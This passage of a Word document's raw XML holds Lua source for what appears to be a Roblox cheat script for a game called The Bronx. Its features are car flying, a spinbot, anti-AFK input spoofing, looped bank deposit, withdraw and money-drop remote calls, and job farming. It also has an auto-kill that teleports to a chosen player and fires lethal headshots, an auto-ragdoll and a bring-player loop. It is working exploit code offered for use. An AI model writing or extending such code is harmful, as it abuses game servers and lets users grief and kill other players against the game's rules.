      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                lastCar = nil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>
      <w:r>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>RunService.RenderStepped:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not Config.TheBronx.carfly then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Cleanup()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if not car or not seat or not hum or not hum.SeatPart or hum.SeatPart ~= seat then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if not root then Setup() return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not bv or not bg then Setup() return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local speed = Config.TheBronx.carflyspeed or 120</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local cam = workspace.CurrentCamera</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local camLook = cam.CFrame.LookVector</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local camRight = cam.CFrame.RightVector</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        bg.CFrame = CFrame.lookAt(root.Position, root.Position + camLook)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local move = Vector3.zero</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if UIS:IsKeyDown(Enum.KeyCode.W) then move += camLook end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if UIS:IsKeyDown(Enum.KeyCode.S) then move -= camLook end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if UIS:IsKeyDown(Enum.KeyCode.A) then move -= camRight end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if UIS:IsKeyDown(Enum.KeyCode.D) then move += camRight end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if move.Magnitude &gt; 0 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        bv.Velocity = move.Unit * speed</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        bv.Velocity = Vector3.zero</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>--new try</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local ReplicatedStorage = game:GetService("ReplicatedStorage")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    while true do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not Config.TheBronx.AutoDrop then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.wait(0.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ReplicatedStorage:WaitForChild("BankProcessRemote"):InvokeServer("Drop", tostring(Config.TheBronx.MoneyAmount))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(0.05)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">end))            </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>--autopass</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local Players = game:GetService("Players")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local TextChatService = game:GetService("TextChatService")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local RunService = game:GetService("RunService")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local LocalPlayer = Players.LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local lastSend = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local lastCheck = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local cachedClosest = nil</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local MaxPassDistance = 25</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local function GetClosestPlayer()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local closest = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local shortest = math.huge</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local char = LocalPlayer.Character</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not char or not char:FindFirstChild("HumanoidRootPart") then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return nil </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local myPos = char.HumanoidRootPart.Position</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for _, p in ipairs(Players:GetPlayers()) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if p ~= LocalPlayer </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            and p.Character </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            and p.Character:FindFirstChild("HumanoidRootPart") </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local dist = (p.Character.HumanoidRootPart.Position - myPos).Magnitude</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if dist &lt; shortest and dist &lt;= MaxPassDistance then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                shortest = dist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                closest = p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return closest</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>RunService.RenderStepped:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not Config.TheBronx.autopass then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local char = LocalPlayer.Character</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not char then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local tool = char:FindFirstChildOfClass("Tool")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not tool then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local tickNow = tick()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if tickNow - lastCheck &gt; 0.15 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        lastCheck = tickNow</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        cachedClosest = GetClosestPlayer()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if cachedClosest and tickNow - lastSend &gt; 1 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        lastSend = tickNow</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if channel then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            channel:SendAsync("/passto " .. cachedClosest.Name)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>--autopass end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>--spinbot</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local RunService = game:GetService("RunService")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local Players = game:GetService("Players")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local LocalPlayer = Players.LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local spinAngle = 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>RunService.RenderStepped:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not Config.TheBronx.spinbotter then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local char = LocalPlayer.Character</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local hrp = char and char:FindFirstChild("HumanoidRootPart")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not hrp then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local spinSpeed = Config.TheBronx.spinbotterspeed or 30</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    spinAngle = (spinAngle + spinSpeed) % 360</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hrp.CFrame = CFrame.new(hrp.Position) * CFrame.Angles(0, math.rad(spinAngle), 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>--spinbot end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>-- anti afk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local Players = game:GetService("Players")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local UIS = game:GetService("UserInputService")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local RS = game:GetService("RunService")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local LocalPlayer = Players.LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if Config.TheBronx.antiafk then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        while true do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.wait(30)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local mousePos = Vector2.new(math.random(0, 100), math.random(0, 100))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                UIS.InputChanged:Fire(UIS, Enum.UserInputType.MouseMovement, mousePos)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                UIS.WindowFocusReleased:Fire()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait(0.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                UIS.WindowFocused:Fire()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local fakeInput = Enum.KeyCode.W</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                UIS.InputBegan:Fire(UIS, fakeInput, false)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait(0.05)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                UIS.InputEnded:Fire(UIS, fakeInput, false)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>--anti afk end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while task.wait(.25) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.TheBronx.depos then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ReplicatedStorage:WaitForChild("BankAction"):FireServer("depo", tostring(Config.TheBronx.DepositAmount))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while task.wait(.25) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.TheBronx.draww then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ReplicatedStorage:WaitForChild("BankAction"):FireServer("with", tostring(Config.TheBronx.WithdrawAmount))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end))      </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while task.wait(1) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.TheBronx.PlayerUtilities.AutoKill then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") or not Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer) or not Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character or not Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character:FindFirstChild("HumanoidRootPart") then continue end                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character:FindFirstChildOfClass("Tool") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunScript_Local") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character:FindFirstChild("Humanoid").Health == 0 then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character:FindFirstChildOfClass("ForceField") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if RequireSupport then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        kill_gun(Config.TheBronx.PlayerUtilities.SelectedPlayer, 'Head', math.huge)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if DistanceCheck(Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer), 300) == false then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local OldCFrame = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Teleport(Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character:FindFirstChild("HumanoidRootPart").CFrame)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            kill_gun(Config.TheBronx.PlayerUtilities.SelectedPlayer, 'Head', math.huge)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Teleport(OldCFrame)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            kill_gun(Config.TheBronx.PlayerUtilities.SelectedPlayer, 'Head', math.huge)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task.wait(2) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.TheBronx.PlayerUtilities.AutoRagdoll then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") or not Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer) or not Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character or not Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character:FindFirstChild("HumanoidRootPart") then continue end                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character:FindFirstChildOfClass("Tool") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunScript_Local") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character:FindFirstChild("Humanoid").Health == 0 then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character:FindFirstChild("Humanoid"):GetState() == Enum.HumanoidStateType.Physics then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    kill_gun(Config.TheBronx.PlayerUtilities.SelectedPlayer, 'RightUpperLeg', 0.01)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task.wait() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.TheBronx.PlayerUtilities.BringingPlayer then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if tostring(Config.TheBronx.PlayerUtilities.SelectedPlayer) == tostring(LocalPlayer) then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") or not Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer) or not Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character or not Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character:FindFirstChild("HumanoidRootPart") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character:FindFirstChild("HumanoidRootPart").CFrame = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame + Vector3.new(2, 0, 0)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true do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.TheBronx.VehicleModifications.SpeedEnabled and UserInputService:IsKeyDown(Enum.KeyCode.W) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if LocalPlayer.Character and typeof(LocalPlayer.Character) == "Instance" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local Humanoid = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if Humanoid and typeof(Humanoid) == "Instance" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    local SeatPart = Humanoid.SeatPart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    if SeatPart and typeof(SeatPart) == "Instance" and SeatPart:IsA("VehicleSeat") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        SeatPart.AssemblyLinearVelocity *= Vector3.new(1 + Config.TheBronx.VehicleModifications.SpeedValue, 1, 1 + Config.TheBronx.VehicleModifications.SpeedValue)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true do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.TheBronx.VehicleModifications.BreakEnabled and UserInputService:IsKeyDown(Enum.KeyCode.S) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if LocalPlayer.Character and typeof(LocalPlayer.Character) == "Instance" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local Humanoid = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if Humanoid and typeof(Humanoid) == "Instance" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    local SeatPart = Humanoid.SeatPart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    if SeatPart and typeof(SeatPart) == "Instance" and SeatPart:IsA("VehicleSeat") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        SeatPart.AssemblyLinearVelocity *= Vector3.new(1 - Config.TheBronx.VehicleModifications.BreakValue, 1, 1 - Config.TheBronx.VehicleModifications.BreakValue)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GetPlaceToPlaceWood = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in Workspace.ConstructionStuff:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Value.Name:find("Wall") and Value:IsA("Part") and Value:FindFirstChild("Prompt") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Value:FindFirstChild("Prompt").Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            return Value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task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while true do task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.TheBronx.Farms.FarmConstructionJob then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character:FindFirstChild("Humanoid") or LocalPlayer.Character:FindFirstChild("Humanoid").Health == 0 then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer:GetAttribute("WorkingJob") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
